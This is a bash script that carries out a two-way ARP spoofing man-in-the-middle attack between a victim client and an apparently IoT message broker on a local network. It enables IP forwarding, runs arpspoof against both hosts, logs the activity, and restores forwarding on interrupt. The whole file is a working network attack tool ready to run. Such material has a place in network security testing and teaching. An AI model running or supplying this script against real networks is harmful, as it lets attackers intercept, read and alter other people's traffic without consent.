#!/bin/bash

INTERFACE="eth0"
VICTIM_IP="192.168.86.43"
BROKER_IP="192.168.86.182"

LOG_FILE="arp_spoof.log"

echo "[*] Start ARP Spoofing..."
echo "{*] MITM between Client($VICTIM_IP) and Broker($BROKER_IP)" | tee -a $LOG_FILE

# Activate IP fowarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Start ARP Spoofing
echo "[*] Sending ARP spoofing packets to CLIENT..." | tee -a $LOG_FILE
arpspoof -i $INTERFACE -t $VICTIM_IP $BROKER_IP >> $LOG_FILE 2>&1 &
ARP_PID1=$!

echo "[*] Sending ARP spoofing packets to BROKER,,," | tee -a $LOG_FILE
arpspoof -i $INTERFACE -t $BROKER_IP $VICTIM_IP >> $LOG_FILE 2>&1 &
ARP_PID2=$!

trap "echo '[*] Stopping ARP spoofing...' | tee -a $LOG_FILE; kill $ARP_PID1 $ARP_PID2; echo 0 > /proc/sys/net/ipv4/ip_forward; exit" INT

while true; do
	sleep 1
done
